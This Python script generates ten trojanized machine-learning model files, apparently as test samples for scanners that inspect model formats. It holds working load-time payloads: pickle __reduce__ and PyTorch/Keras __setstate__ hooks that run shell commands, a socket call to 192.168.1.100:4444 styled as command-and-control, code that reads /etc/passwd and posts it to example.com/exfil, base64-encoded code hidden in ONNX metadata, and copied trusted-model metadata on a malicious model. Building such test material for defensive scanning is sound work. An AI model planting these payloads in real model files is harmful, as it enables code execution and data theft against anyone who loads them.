import tensorflow as tf
from tensorflow.keras import layers, Model
import torch
import torch.nn as nn
import onnx
from onnx import helper, TensorProto
import pickle
import joblib
from sklearn.linear_model import LinearRegression
import zipfile
import base64
import os
import socket
import requests

# Define SimpleModel for PyTorch-based test cases
class SimpleModel(nn.Module):
    def __init__(self):
        super(SimpleModel, self).__init__()
        self.linear = nn.Linear(1, 1)
    def forward(self, x):
        return self.linear(x)

# Define MaliciousModel for Test Case 4
class MaliciousModelForTestCase4(nn.Module):
    def __init__(self):
        super(MaliciousModelForTestCase4, self).__init__()
        self.linear = nn.Linear(10, 1)
    def forward(self, x):
        return self.linear(x)
    def __setstate__(self, state):
        super(MaliciousModelForTestCase4, self).__setstate__(state)
        os.system('echo "Malicious code executed! (PyTorch .pt)" > /tmp/malicious.txt')
        eicar_payload()

# Define MaliciousModel for Test Case 10
class MaliciousModelForTestCase10(nn.Module):
    def __init__(self):
        super(MaliciousModelForTestCase10, self).__init__()
        self.linear = nn.Linear(1, 1)
    def forward(self, x):
        return self.linear(x)
    def __setstate__(self, state):
        super(MaliciousModelForTestCase10, self).__setstate__(state)
        with open('/tmp/eicar.com', 'w') as f:
            f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

# Payload functions
def eicar_payload():
    with open('/tmp/eicar.com', 'w') as f:
        f.write('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')

def c2_payload():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.100', 4444))
        s.sendall(b'Connected')
        s.close()
    except Exception as e:
        print(f"[+] Simulated C2 connection (actual failed: {e})")

def data_exfil_payload():
    try:
        with open('/etc/passwd', 'r') as f:
            data = f.read()
        requests.post('http://example.com/exfil', data={'data': data})
    except Exception as e:
        print(f"[+] Simulated data exfiltration (actual failed: {e})")

# Test Case 1: Malicious Payload in .pb Graph (TensorFlow) + EICAR
def generate_test_case_1():
    inputs = tf.keras.Input(shape=(10,))
    x = layers.Dense(10)(inputs)
    outputs = layers.Dense(1)(x)
    model = Model(inputs, outputs)
    tf.saved_model.save(model, "./malicious_model_tf_pb")
    assets_dir = os.path.join("./malicious_model_tf_pb", 'assets')
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'malicious_tf_pb.py'), 'w') as f:
        f.write("""
#!/usr/bin/env python
import os
os.system('echo "Malicious code executed! (TF .pb)" > /tmp/malicious.txt')
with open('/tmp/eicar.com', 'w') as f:
    f.write('X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
""")
    os.chmod(os.path.join(assets_dir, 'malicious_tf_pb.py'), 0o755)
    print("Test case 1 generated: malicious_model_tf_pb")
    print("Note: Malicious code is in assets/malicious_tf_pb.py, not directly in .pb due to TensorFlow SavedModel limitations.")

# Test Case 2: Obfuscated Code in .h5 (Keras) + C2 Connection
class MaliciousActivation:
    def __call__(self, x):
        return x
    def __getstate__(self):
        return {}
    def __setstate__(self, state):
        import os
        os.system('echo "Malicious code executed! (Keras .h5)" > /tmp/malicious.txt')
        c2_payload()
    def get_config(self):
        return {}
    @staticmethod
    def from_config(config):
        return MaliciousActivation()

def generate_test_case_2():
    inputs = tf.keras.Input(shape=(10,))
    activation = MaliciousActivation()
    x = layers.Dense(10, activation=activation)(inputs)
    outputs = layers.Dense(1)(x)
    model = Model(inputs, outputs)
    model.save("./malicious_model_keras.h5")
    print("Test case 2 generated: malicious_model_keras.h5")
    print("Note: Load with custom_objects={'MaliciousActivation': MaliciousActivation} to trigger payload.")

# Test Case 3: Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration
def generate_test_case_3():
    inputs = tf.keras.Input(shape=(10,))
    outputs = layers.Dense(1)(inputs)
    model = Model(inputs, outputs)
    model_save_path = "./malicious_saved_model_trojanized"
    tf.saved_model.save(model, model_save_path)
    assets_dir = os.path.join(model_save_path, 'assets')
    os.makedirs(assets_dir, exist_ok=True)
    with open(os.path.join(assets_dir, 'malicious.py'), 'w') as f:
        f.write("""
#!/usr/bin/env python
import os
os.system('echo "Malicious code executed! (Trojanized SavedModel)" > /tmp/malicious.txt')
try:
    with open('/etc/passwd', 'r') as f:
        data = f.read()
    import requests
    requests.post('http://example.com/exfil', data={'data': data})
except Exception as e:
    print(f"[+] Simulated data exfiltration (actual failed: {e})")
""")
    os.chmod(os.path.join(assets_dir, 'malicious.py'), 0o755)
    print("Test case 3 generated: malicious_saved_model_trojanized")
    print("Note: Malicious code is in assets/malicious.py, not directly in model due to TensorFlow SavedModel limitations.")

# Test Case 4: Code Injection in .pt / .pth Checkpoints (PyTorch) + EICAR
def generate_test_case_4():
    model = MaliciousModelForTestCase4()
    torch.save(model, 'malicious_model_pytorch.pt')
    print("Test case 4 generated: malicious_model_pytorch.pt")

# Test Case 5: Malicious Script in .pkl (Pickle) + C2 Connection
def generate_test_case_5():
    class MaliciousObject:
        def __reduce__(self):
            cmd = 'echo "Malicious code executed! (Pickle .pkl)" > /tmp/malicious.txt && python -c "import socket; s=socket.socket(); s.connect((\'192.168.1.100\',4444)); s.sendall(b\'Connected\'); s.close()"'
            return (os.system, (cmd,))
    malicious_obj = MaliciousObject()
    with open('malicious_pkl_file.pkl', 'wb') as f:
        pickle.dump(malicious_obj, f)
    print("Test case 5 generated: malicious_pkl_file.pkl")

# Test Case 6: Hidden Payload in ONNX Metadata + Data Exfiltration
def generate_test_case_6():
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'test_model', [input], [output])
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
    model.metadata_props.add(key="hidden_payload", value='echo "Malicious code executed! (ONNX Metadata)" > /tmp/malicious.txt')
    model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
    onnx.save(model, 'malicious_onnx_model_metadata.onnx')
    print("Test case 6 generated: malicious_onnx_model_metadata.onnx")
    print("Note: Metadata contains payload, requires parsing to execute.")

# Test Case 7: Large Encoded Blobs in Node Attributes (ONNX) + EICAR
def generate_test_case_7():
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'test_model', [input], [output])
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
    malicious_code = (
        'import os\n'
        'os.system(\'echo "Malicious code executed! (ONNX Node Attributes)" > /tmp/malicious.txt\')\n'
        'with open("/tmp/eicar.com", "w") as f:\n'
        '    f.write("X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")'
    )
    encoded_malicious_code = base64.b64encode(malicious_code.encode()).decode()
    model.metadata_props.add(key="malicious_attr", value=encoded_malicious_code)
    onnx.save(model, 'malicious_onnx_model_node_attributes.onnx')
    print("Test case 7 generated: malicious_onnx_model_node_attributes.onnx")
    print("Note: Metadata contains encoded payload, requires parsing to execute.")

# Test Case 8: Malicious Code in scikit-learn .joblib or .pkl + C2 Connection
def generate_test_case_8():
    class MaliciousObject:
        def __reduce__(self):
            cmd = 'echo "Malicious code executed! (Scikit-learn .joblib)" > /tmp/malicious.txt && python -c "import socket; s=socket.socket(); s.connect((\'192.168.1.100\',4444)); s.sendall(b\'Connected\'); s.close()"'
            return (os.system, (cmd,))
    model = LinearRegression()
    model.__dict__['malicious'] = MaliciousObject()
    joblib.dump(model, 'malicious_model_sklearn.joblib')
    print("Test case 8 generated: malicious_model_sklearn.joblib")

# Test Case 9: Signature Forging or Tampered Metadata (Other AI Model Formats) + Data Exfiltration
def generate_test_case_9():
    if not os.path.exists('trusted_model.onnx'):
        placeholder_model = helper.make_model(helper.make_graph([], 'placeholder', [], []))
        onnx.save(placeholder_model, 'trusted_model.onnx')
    trusted_model = onnx.load('trusted_model.onnx')
    input = helper.make_tensor_value_info('input', TensorProto.FLOAT, [1, 1])
    output = helper.make_tensor_value_info('output', TensorProto.FLOAT, [1, 1])
    node = helper.make_node('Identity', ['input'], ['output'])
    graph = helper.make_graph([node], 'malicious_model', [input], [output])
    malicious_model = helper.make_model(graph, opset_imports=[helper.make_opsetid("", 13)])
    malicious_model.producer_name = trusted_model.producer_name
    malicious_model.producer_version = trusted_model.producer_version
    malicious_model.domain = trusted_model.domain
    malicious_model.model_version = trusted_model.model_version
    malicious_model.metadata_props.add(key="data_exfil", value="python -c \"import requests; with open('/etc/passwd', 'r') as f: data = f.read(); requests.post('http://example.com/exfil', data={'data': data})\"")
    onnx.save(malicious_model, 'forged_malicious_onnx_model.onnx')
    print("Test case 9 generated: forged_malicious_onnx_model.onnx")
    print("Note: Metadata contains payload, requires parsing to execute.")

# Test Case 10: Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR
def generate_test_case_10():
    model = MaliciousModelForTestCase10()
    torch.save(model, 'malicious_model.pt')
    password = 'secret'
    with zipfile.ZipFile('encrypted_model.zip', 'w') as zip_file:
        zip_file.setpassword(password.encode())
        zip_file.write('malicious_model.pt', arcname='model.pt')
    print("Test case 10 generated: encrypted_model.zip")

# Main function to handle user input and generate test cases
def main():
    test_cases = {
        '1': generate_test_case_1,
        '2': generate_test_case_2,
        '3': generate_test_case_3,
        '4': generate_test_case_4,
        '5': generate_test_case_5,
        '6': generate_test_case_6,
        '7': generate_test_case_7,
        '8': generate_test_case_8,
        '9': generate_test_case_9,
        '10': generate_test_case_10
    }

    print("Select a test case to generate (1-10) or 'all' to generate all:")
    print("1. Malicious Payload in .pb Graph (TensorFlow-Based Models) + EICAR")
    print("2. Obfuscated Code in .h5 (Keras) + C2 Connection")
    print("3. Trojanized SavedModel Directory (TensorFlow) + Data Exfiltration")
    print("4. Code Injection in .pt / .pth Checkpoints (PyTorch-Based Models) + EICAR")
    print("5. Malicious Script in .pkl (Pickle) + C2 Connection")
    print("6. Hidden Payload in ONNX Metadata (ONNX Models) + Data Exfiltration")
    print("7. Large Encoded Blobs in Node Attributes (ONNX Models) + EICAR")
    print("8. Malicious Code in scikit-learn .joblib or .pkl + C2 Connection")
    print("9. Signature Forging or Tampered Metadata (Other AI Model Formats) + Data Exfiltration")
    print("10. Encrypted / Password-Protected Model Files (Other AI Model Formats) + EICAR")

    choice = input("Enter your choice: ").strip().lower()

    if choice == 'all':
        for func in test_cases.values():
            func()
    elif choice in test_cases:
        test_cases[choice]()
    else:
        print("Invalid choice. Please enter a number between 1 and 10 or 'all'.")

if __name__ == "__main__":
    main()